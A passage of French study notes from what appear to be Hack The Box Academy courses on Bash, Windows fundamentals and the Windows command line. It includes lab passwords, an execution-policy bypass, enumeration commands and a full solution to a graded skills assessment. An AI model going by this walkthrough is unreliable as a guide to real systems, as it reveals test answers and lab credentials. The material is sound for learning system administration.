<li><code>function network_range { … }</code></li>
<li><code>function ping_host { … }</code></li>
</ul>
<h3>Codes de retour &amp; <code>$?</code></h3>
<p>Chaque fonction ou commande retourne un <strong>exit code</strong> :</p>
<ul>
<li><code>0</code> → succès</li>
<li>non-0 → erreur de différents types</li>
</ul>
<p>Exemple :</p>
<div class="codehilite">
<pre><span></span><code>myfunc<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">1</span>
<span class="w">  </span><span class="k">else</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span>
<span class="w">  </span><span class="k">fi</span>
<span class="o">}</span>

myfunc
<span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span><span class="w">     </span><span class="c1"># affiche 1</span>

myfunc<span class="w"> </span><span class="s2">"arg"</span>
<span class="nb">echo</span><span class="w"> </span><span class="nv">$?</span><span class="w">     </span><span class="c1"># affiche 0</span>
</code></pre>
</div>
<p>Tu peux aussi récupérer la <strong>sortie</strong> d’une fonction dans une variable :</p>
<div class="codehilite">
<pre><span></span><code><span class="nv">result</span><span class="o">=</span><span class="k">$(</span>myfunc<span class="w"> </span><span class="s2">"arg"</span><span class="k">)</span>
</code></pre>
</div>
<h2>Debugging Bash</h2>
<p>Bash fournit deux options très pratiques pour <strong>débugger</strong> :</p>
<ul>
<li><code>x</code> : montre chaque commande exécutée, arguments inclus</li>
<li><code>v</code> : affiche le code source lu, puis ce qui est exécuté</li>
</ul>
<p>Exemples :</p>
<div class="codehilite">
<pre><span></span><code>bash<span class="w"> </span>-x<span class="w"> </span>script.sh<span class="w">          </span><span class="c1"># trace d’exécution</span>
bash<span class="w"> </span>-x<span class="w"> </span>-v<span class="w"> </span>script.sh<span class="w">       </span><span class="c1"># trace + code</span>
</code></pre>
</div>
<p>On voit alors ligne par ligne :</p>
<ul>
<li>les conditions évaluées</li>
<li>les valeurs des variables</li>
<li>où le script sort / plante</li>
</ul>
<h2>Ce que j’ai retenu pour la pratique (pentest / admin)</h2>
<ul>
<li>Bash permet de <strong>prototyper très vite</strong> des petits outils (comme <code>CIDR.sh</code>) pour :
<ul>
<li>résoudre un domaine → IP,</li>
<li>extraire le NetRange,</li>
<li>ping un range complet,</li>
<li>logguer les résultats automatiquement.</li>
</ul></li>
<li>Les briques de base que je dois maîtriser par cœur :
<ul>
<li><strong>Arguments &amp; variables spéciales</strong> : <code>$#</code>, <code>$0</code>, <code>$1</code>, <code>$?</code></li>
<li><strong>Tests</strong> : <code>if</code>, <code>[[ … ]]</code>, opérateurs <code>eq</code>, <code>gt</code>, <code>e</code>, <code>r</code>, <code>&amp;&amp;</code>, <code>||</code></li>
<li><strong>Boucles</strong> : <code>for</code>, <code>while</code>, <code>until</code></li>
<li><strong>Fonctions</strong> + codes de retour (<code>return</code>, <code>$?</code>)</li>
<li><strong>IO</strong> : <code>read -p</code>, redirections, <code>tee</code>, pipes</li>
</ul></li>
<li>Pour débugger rapidement un script qui ne fait “rien” ou boucle :
<ul>
<li>ajouter <code>set -x</code> en haut du script <strong>ou</strong></li>
<li>lancer avec <code>bash -x script.sh</code> pour voir ce qui se passe réellement.</li>
</ul></li>
</ul>
<h2>windows fundamentals</h2>
<h1>Connexion &amp; outils</h1>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Depuis Pwnbox (Linux) — RDP</span>
xfreerdp<span class="w"> </span>/v:&lt;IP&gt;<span class="w"> </span>/u:htb-student<span class="w"> </span>/p:Academy_WinFun!
</code></pre>
</div>
<div class="codehilite">
<pre><span></span><code><span class="c"># Vérifier si ta console PowerShell est en admin (True = admin)</span>
<span class="p">(</span><span class="no">[Security.Principal.WindowsPrincipal]</span>
 <span class="no">[Security.Principal.WindowsIdentity]</span><span class="p">::</span><span class="n">GetCurrent</span><span class="p">()</span>
<span class="p">).</span><span class="n">IsInRole</span><span class="p">(</span><span class="no">[Security.Principal.WindowsBuiltInRole]</span><span class="p">::</span><span class="n">Administrator</span><span class="p">)</span>

<span class="c"># Ouvrir une nouvelle PowerShell en admin</span>
<span class="nb">Start-Process</span> <span class="n">powershell</span> <span class="n">-Verb</span> <span class="n">RunAs</span>
</code></pre>
</div>
<h1>Version Windows &amp; Build Number</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Build Number</span>
<span class="nb">Get-CimInstance</span> <span class="n">Win32_OperatingSystem</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">BuildNumber</span>

<span class="c"># NT version (Windows X)</span>
<span class="p">(</span><span class="nv">$os</span> <span class="p">=</span> <span class="nb">Get-CimInstance</span> <span class="n">Win32_OperatingSystem</span><span class="p">).</span><span class="n">Caption</span>
<span class="p">(</span><span class="nv">$os</span><span class="p">.</span><span class="n">Caption</span> <span class="o">-match</span> <span class="s1">'Windows \d+'</span><span class="p">)&gt;</span><span class="nv">$null</span><span class="p">;</span> <span class="nv">$matches</span><span class="p">[</span><span class="n">0</span><span class="p">]</span>
</code></pre>
</div>
<h1>OS Structure — Dossier “non-standard” &amp; flag</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Lister racine C:\</span>
<span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Force</span> <span class="n">-Directory</span>

<span class="c"># Détecter dossier(s) non standard et lire le flag</span>
<span class="nv">$std</span><span class="p">=</span><span class="s1">'PerfLogs'</span><span class="p">,</span><span class="s1">'Program Files'</span><span class="p">,</span><span class="s1">'Program Files (x86)'</span><span class="p">,</span><span class="s1">'ProgramData'</span><span class="p">,</span><span class="s1">'Users'</span><span class="p">,</span><span class="s1">'Windows'</span><span class="p">,</span><span class="s1">'Recovery'</span><span class="p">,</span><span class="s1">'$Recycle.Bin'</span><span class="p">,</span><span class="s1">'$WinREAgent'</span><span class="p">,</span><span class="s1">'System Volume Information'</span>
<span class="nv">$odd</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Force</span> <span class="n">-Directory</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="n">-notin</span> <span class="nv">$std</span>
<span class="nv">$odd</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">Name</span><span class="p">,</span><span class="n">FullName</span>
<span class="nb">Get-ChildItem</span> <span class="nv">$odd</span><span class="p">.</span><span class="n">FullName</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-match</span> <span class="s1">'flag'</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">1</span> <span class="n">-Expand</span> <span class="n">FullName</span> <span class="p">|</span> <span class="nb">Get-Content</span>
</code></pre>
</div>
<h1>NTFS — Qui a Full Control sur <code>C:\Users</code></h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Vue rapide</span>
<span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span>

<span class="c"># Filtrer SYSTEM Full Control</span>
<span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s1">'NT AUTHORITY\\SYSTEM:.*\(F\)'</span>

<span class="c"># 100% PowerShell</span>
<span class="p">(</span><span class="nb">Get-Acl</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">).</span><span class="n">Access</span> <span class="p">|</span>
  <span class="nb">Where-Object</span> <span class="p">{</span>
    <span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-eq</span> <span class="s1">'NT AUTHORITY\SYSTEM'</span> <span class="o">-and</span>
    <span class="nv">$_</span><span class="p">.</span><span class="n">AccessControlType</span> <span class="o">-eq</span> <span class="s1">'Allow'</span> <span class="o">-and</span>
    <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">FileSystemRights</span> <span class="o">-band</span> <span class="no">[System.Security.AccessControl.FileSystemRights]</span><span class="p">::</span><span class="n">FullControl</span><span class="p">)</span>
  <span class="p">}</span>
</code></pre>
</div>
<h1>NTFS vs Share Permissions — Créer &amp; tester le partage</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Créer le dossier à partager (exemple)</span>
<span class="nv">$sharePath</span> <span class="p">=</span> <span class="s2">"$env:USERPROFILE\Desktop\Company Data"</span>
<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="n">-Path</span> <span class="nv">$sharePath</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</code></pre>
</div>
<blockquote>
<p>(en admin)</p>
</blockquote>
<div class="codehilite">
<pre><span></span><code><span class="c"># Créer le partage SMB</span>
<span class="nb">New-SmbShare</span> <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="n">-Path</span> <span class="nv">$sharePath</span>

<span class="c"># Voir les partages</span>
<span class="nb">Get-SmbShare</span>
<span class="n">net</span> <span class="n">share</span>
</code></pre>
</div>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Depuis Pwnbox — lister &amp; monter</span>
smbclient<span class="w"> </span>-L<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-U<span class="w"> </span>htb-student
smbclient<span class="w"> </span><span class="s1">'\\&lt;IP&gt;\Company Data'</span><span class="w"> </span>-U<span class="w"> </span>htb-student

<span class="c1"># (optionnel) monter via CIFS:</span>
sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>cifs-utils
sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>-o<span class="w"> </span><span class="nv">username</span><span class="o">=</span>htb-student,password<span class="o">=</span>Academy_WinFun!<span class="w"> </span><span class="s2">"//&lt;IP&gt;/Company Data"</span><span class="w"> </span>~/Desktop/CompanyData
</code></pre>
</div>
<h1>Services &amp; Processus — “update” non-standard &amp; exécutable</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Lister services "update-like" en cours</span>
<span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="n">-Filter</span> <span class="s2">"State='Running'"</span> <span class="p">|</span>
  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-match</span> <span class="s1">'update|arm|gupdate|foxit'</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DisplayName</span> <span class="o">-match</span> <span class="s1">'Update'</span> <span class="p">}</span> <span class="p">|</span>
  <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">DisplayName</span><span class="p">,</span><span class="n">PathName</span>

<span class="c"># Extraire uniquement le .exe d'un service précis (ex: Foxit)</span>
<span class="nv">$svc</span> <span class="p">=</span> <span class="nb">Get-CimInstance</span> <span class="n">Win32_Service</span> <span class="n">-Filter</span> <span class="s2">"Name='FoxitReaderUpdateService'"</span>
<span class="p">(</span><span class="nv">$svc</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-replace</span> <span class="s1">'^"?(.*?\.exe).*$'</span><span class="p">,</span> <span class="s1">'$1'</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Split-Path</span> <span class="n">-Leaf</span>
</code></pre>
</div>
<h1>Interagir avec l’OS — alias &amp; Execution Policy</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Alias pointant vers ipconfig.exe</span>
<span class="nb">Get-Alias</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Definition</span> <span class="o">-match</span> <span class="s1">'ipconfig(\.exe)?$'</span>   <span class="c"># =&gt; ifconfig -&gt; ipconfig.exe</span>

<span class="c"># Pas d’alias pour ipconfig.exe lui-même</span>
<span class="nb">Get-Command</span> <span class="n">ipconfig</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">CommandType</span><span class="p">,</span><span class="n">Name</span><span class="p">,</span><span class="n">Path</span>
<span class="nb">Get-Alias</span> <span class="n">-Definition</span> <span class="n">ipconfig</span><span class="p">.</span><span class="n">exe</span>

<span class="c"># Execution Policy (toutes portées)</span>
<span class="nb">Get-ExecutionPolicy</span> <span class="n">-List</span>

<span class="c"># Bypass temporaire pour cette session</span>
<span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">-Force</span>
</code></pre>
</div>
<h1>WMI — Serial Number</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Serial de l’OS (souvent attendu dans la page WMI)</span>
<span class="p">(</span><span class="nb">Get-CimInstance</span> <span class="n">Win32_OperatingSystem</span><span class="p">).</span><span class="n">SerialNumber</span>
<span class="n">wmic</span> <span class="n">os</span> <span class="n">get</span> <span class="n">SerialNumber</span>

<span class="c"># Serial matériel (BIOS), si demandé</span>
<span class="p">(</span><span class="nb">Get-CimInstance</span> <span class="n">Win32_BIOS</span><span class="p">).</span><span class="n">SerialNumber</span>
<span class="n">wmic</span> <span class="n">bios</span> <span class="n">get</span> <span class="n">serialnumber</span>
</code></pre>
</div>
<h1>Windows Security — SID d’un user &amp; applis démarrage (désactivées)</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># SID utilisateur (ex: bob.smith)</span>
<span class="n">wmic</span> <span class="n">useraccount</span> <span class="nb">where </span><span class="n">name</span><span class="p">=</span><span class="s1">'bob.smith'</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">sid</span>
<span class="p">(</span><span class="nb">Get-LocalUser</span> <span class="n">-Name</span> <span class="s1">'bob.smith'</span><span class="p">).</span><span class="n">SID</span><span class="p">.</span><span class="n">Value</span>
</code></pre>
</div>
<div class="codehilite">
<pre><span></span><code><span class="c"># Applications de démarrage (HKCU) désactivées</span>
<span class="nv">$k</span><span class="p">=</span><span class="s1">'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'</span>
<span class="nb">Get-ItemProperty</span> <span class="nv">$k</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
  <span class="nv">$_</span><span class="p">.</span><span class="n">PSObject</span><span class="p">.</span><span class="n">Properties</span> <span class="p">|</span>
    <span class="nb">Where-Object</span> <span class="n">MemberType</span> <span class="o">-eq</span> <span class="n">NoteProperty</span> <span class="p">|</span>
    <span class="k">ForEach</span><span class="n">-Object</span><span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Value</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="o">-eq</span> <span class="n">3</span><span class="p">){</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="p">}</span> <span class="c"># 3 = Disabled</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c"># Récupérer la commande associée (Run)</span>
<span class="nv">$run</span><span class="p">=</span><span class="s1">'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'</span>
<span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="nv">$run</span><span class="p">).</span><span class="n">PSObject</span><span class="p">.</span><span class="n">Properties</span> <span class="p">|</span>
  <span class="nb">Where-Object</span> <span class="n">MemberType</span> <span class="o">-eq</span> <span class="n">NoteProperty</span> <span class="p">|</span>
  <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">Value</span>
</code></pre>
</div>
<h1>Skills Assessment — Script complet (admin) étapes 1→8</h1>
<blockquote>
<p>Ouvre PowerShell en admin puis colle :</p>
</blockquote>
<div class="codehilite">
<pre><span></span><code><span class="c"># === Vars ===</span>
<span class="nv">$root</span> <span class="p">=</span> <span class="s2">"$env:USERPROFILE\Desktop\Company Data"</span>
<span class="nv">$hr</span>   <span class="p">=</span> <span class="nb">Join-Path</span> <span class="nv">$root</span> <span class="s1">'HR'</span>

<span class="c"># 1-2) Dossiers</span>
<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="n">-Path</span> <span class="nv">$root</span><span class="p">,</span><span class="nv">$hr</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>

<span class="c"># 3) Utilisateur Jim (sans "must change password")</span>
<span class="nv">$pw</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">'Htb!Passw0rd'</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Get-LocalUser</span> <span class="n">-Name</span> <span class="n">Jim</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">New-LocalUser</span> <span class="n">-Name</span> <span class="n">Jim</span> <span class="n">-Password</span> <span class="nv">$pw</span> <span class="n">-PasswordNeverExpires</span><span class="p">:</span><span class="nv">$true</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="p">}</span>

<span class="c"># 4) Groupe HR</span>
<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Get-LocalGroup</span> <span class="n">-Name</span> <span class="n">HR</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">New-LocalGroup</span> <span class="n">-Name</span> <span class="n">HR</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="p">}</span>

<span class="c"># 5) Ajouter Jim au groupe HR</span>
<span class="nb">Add-LocalGroupMember</span> <span class="n">-Group</span> <span class="n">HR</span> <span class="n">-Member</span> <span class="n">Jim</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span>

<span class="c"># 6) Partage "Company Data" + Share Permissions (Change &amp; Read pour HR) et retirer Everyone</span>
<span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Get-SmbShare</span> <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span><span class="p">))</span> <span class="p">{</span>
  <span class="nb">New-SmbShare</span> <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="n">-Path</span> <span class="nv">$root</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="p">}</span>
<span class="nb">Revoke-SmbShareAccess</span> <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="n">-AccountName</span> <span class="s1">'Everyone'</span> <span class="n">-Force</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="nb">Grant-SmbShareAccess</span>  <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="n">-AccountName</span> <span class="s1">'HR'</span> <span class="n">-AccessRight</span> <span class="n">Change</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>

<span class="c"># 6) NTFS — désactiver l’héritage + donner Modify, R&amp;E, List, Read, Write (=(OI)(CI)M) à HR</span>
<span class="n">icacls</span> <span class="s2">"$root"</span> <span class="p">/</span><span class="n">inheritance</span><span class="p">:</span><span class="n">d</span>
<span class="n">icacls</span> <span class="s2">"$root"</span> <span class="p">/</span><span class="n">remove</span><span class="p">:</span><span class="n">g</span> <span class="n">Everyone</span>
<span class="n">icacls</span> <span class="s2">"$root"</span> <span class="p">/</span><span class="n">grant</span> <span class="n">HR</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)</span><span class="n">M</span>

<span class="c"># 7) Même NTFS pour le sous-dossier HR</span>
<span class="n">icacls</span> <span class="s2">"$hr"</span> <span class="p">/</span><span class="n">inheritance</span><span class="p">:</span><span class="n">d</span>
<span class="n">icacls</span> <span class="s2">"$hr"</span> <span class="p">/</span><span class="n">remove</span><span class="p">:</span><span class="n">g</span> <span class="n">Everyone</span>
<span class="n">icacls</span> <span class="s2">"$hr"</span> <span class="p">/</span><span class="n">grant</span> <span class="n">HR</span><span class="p">:(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)</span><span class="n">M</span>

<span class="c"># 8) Détails d’un service (Windows Update)</span>
<span class="nb">Get-Service</span> <span class="n">wuauserv</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">DisplayName</span><span class="p">,</span><span class="n">Status</span> <span class="p">|</span> <span class="nb">Format-List</span>

<span class="c"># SIDs à soumettre</span>
<span class="s2">"Jim SID: "</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-LocalUser</span> <span class="n">Jim</span><span class="p">).</span><span class="n">SID</span><span class="p">.</span><span class="n">Value</span>
<span class="s2">"HR  SID: "</span> <span class="p">+</span> <span class="p">(</span><span class="nb">Get-LocalGroup</span> <span class="n">HR</span><span class="p">).</span><span class="n">SID</span><span class="p">.</span><span class="n">Value</span>

<span class="c"># Vérif du Share ACL</span>
<span class="nb">Get-SmbShareAccess</span> <span class="n">-Name</span> <span class="s1">'Company Data'</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Auto</span>
</code></pre>
</div>
<blockquote>
<p>Si tu t’es verrouillé les ACL du dossier, répare puis rejoue la partie NTFS :</p>
</blockquote>
<div class="codehilite">
<pre><span></span><code><span class="n">takeown</span> <span class="p">/</span><span class="n">F</span> <span class="s2">"$root"</span> <span class="p">/</span><span class="nb">R </span><span class="p">/</span><span class="n">D</span> <span class="n">Y</span>
<span class="n">icacls</span> <span class="s2">"$root"</span> <span class="p">/</span><span class="n">reset</span> <span class="p">/</span><span class="n">T</span>
</code></pre>
</div>
<h1>Divers utiles</h1>
<div class="codehilite">
<pre><span></span><code><span class="c"># Ouvrir l’Event Viewer (GUI)</span>
<span class="n">eventvwr</span><span class="p">.</span><span class="n">msc</span>

<span class="c"># Onglet des permissions NTFS dans l’explorateur :</span>
<span class="c"># Clic droit dossier -&gt; Properties -&gt; Security</span>
</code></pre>
</div>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Windows Command Line</strong></summary><div class="indented"><h2>Environnement</h2>
<ul>
<li><strong>Target (Workstation)</strong> : <code>10.129.204.9</code> — <code>ACADEMY-ICL-SKILLS11</code></li>
<li><strong>Domain Controller (DC)</strong> : <code>172.16.5.155</code> — <code>ACADEMY-ICL-DC</code></li>
<li><strong>Comptes</strong> : <code>user0</code> … <code>user10</code></li>
<li><strong>SSH</strong> : se connecter d’abord à la cible, puis au besoin au DC depuis la cible</li>
<li><strong>Shells</strong> :
<ul>
<li><strong>CMD</strong> : invite type <code>C:\Users\userX&gt;</code> (Certaines cmdlets PS ne marchent pas)</li>
<li><strong>PowerShell</strong> : invite type <code>PS C:\Users\userX&gt;</code> (préféré)</li>
</ul></li>
</ul>
<blockquote>
<p>Basculer sur PowerShell depuis CMD :</p>
<p><code>powershell -NoProfile</code></p>
</blockquote>
<h2>Procédure détaillée</h2>
<h3>user0 → bannière (flag)</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user0@10.129.204.9
<span class="c1"># Password: Start!</span>
</code></pre>
</div>
<p>Le <strong>banner</strong> renvoie le flag <strong>user0</strong> → garder comme <strong>mdp user1</strong>.</p>
<h3>user1 → Desktop\flag.txt</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user1@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user0&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nb">Get-Content</span> <span class="s2">"$env:USERPROFILE\Desktop\flag.txt"</span>
</code></pre>
</div>
<ul>
<li>CMD :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nb">type</span><span class="w"> </span><span class="s2">"%USERPROFILE%\Desktop\flag.txt"</span>
</code></pre>
</div>
<p>Flag <strong>user1</strong> → mdp <strong>user2</strong>.</p>
<h3>user2 → hostname</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user2@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user1&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nv">$env:COMPUTERNAME</span>
</code></pre>
</div>
<ul>
<li>CMD :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>hostname
</code></pre>
</div>
<p>Sortie = flag <strong>user2</strong> → mdp <strong>user3</strong>.</p>
<h3>user3 → nb de <strong>fichiers cachés</strong> sur le Desktop</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user3@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user2&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell (fichiers uniquement) :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="p">(</span><span class="nb">Get-ChildItem</span> <span class="s2">"$env:USERPROFILE\Desktop"</span> <span class="n">-Force</span> <span class="o">-File</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Attributes</span> <span class="o">-band</span> <span class="no">[IO.FileAttributes]</span><span class="p">::</span><span class="n">Hidden</span> <span class="p">}).</span><span class="n">Count</span>
</code></pre>
</div>
<ul>
<li>CMD (équivalent) :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>dir<span class="w"> </span><span class="s2">"%USERPROFILE%\Desktop"</span><span class="w"> </span>/a:h<span class="w"> </span>/b<span class="w"> </span>/a:-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>find<span class="w"> </span>/v<span class="w"> </span>/c<span class="w"> </span><span class="s2">""</span>
</code></pre>
</div>
<p>Nombre = flag <strong>user3</strong> → mdp <strong>user4</strong>.</p>
<h3>user4 → flag quelque part dans <strong>Documents</strong></h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user4@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user3&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nb">Select-String</span> <span class="n">-Path</span> <span class="s2">"$env:USERPROFILE\Documents\*"</span> <span class="n">-Pattern</span> <span class="s1">'HTB{'</span> <span class="n">-SimpleMatch</span> <span class="n">-Recurse</span> <span class="n">-List</span> <span class="p">|</span>
  <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nb">Get-Content</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Path</span> <span class="p">}</span>
</code></pre>
</div>
<ul>
<li>CMD :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="k">for</span><span class="w"> </span>/f<span class="w"> </span><span class="s2">"delims="</span><span class="w"> </span>%F<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="s1">'findstr /s /i /m /p "HTB{" "%USERPROFILE%\Documents\*"'</span><span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>@type<span class="w"> </span><span class="s2">"%F"</span>
</code></pre>
</div>
<p>Flag <strong>user4</strong> → mdp <strong>user5</strong>.</p>
<h3>user5 → combien d’<strong>utilisateurs locaux</strong> (sans DefaultAccount, WDAGUtilityAccount)</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user5@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user4&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="p">(</span><span class="nb">Get-LocalUser</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="n">-notin</span> <span class="s1">'DefaultAccount'</span><span class="p">,</span><span class="s1">'WDAGUtilityAccount'</span> <span class="p">}).</span><span class="n">Count</span>
</code></pre>
</div>
<ul>
<li>CMD (fallback) :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>wmic<span class="w"> </span>useraccount<span class="w"> </span>where<span class="w"> </span><span class="s2">"LocalAccount='True' and Name&lt;&gt;'DefaultAccount' and Name&lt;&gt;'WDAGUtilityAccount'"</span><span class="w"> </span>get<span class="w"> </span>Name<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>/r<span class="w"> </span><span class="s2">"^\S"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>find<span class="w"> </span>/c<span class="w"> </span>/v<span class="w"> </span><span class="s2">""</span>
</code></pre>
</div>
<p>Nombre = flag <strong>user5</strong> → mdp <strong>user6</strong>.</p>
<h3>user6 → <strong>RegisteredOwner</strong> (registre)</h3>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>user6@10.129.204.9
<span class="c1"># Password: &lt;FLAG_user5&gt;</span>
</code></pre>
</div>
<ul>
<li>PowerShell :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="s1">'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'</span><span class="p">).</span><span class="n">RegisteredOwner</span>
</code></pre>
</div>
<ul>
<li>CMD :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"</span><span class="w"> </span>/v<span class="w"> </span>RegisteredOwner
</code></pre>
</div>
<p>Valeur = flag <strong>user6</strong> → mdp <strong>user7</strong>.</p>
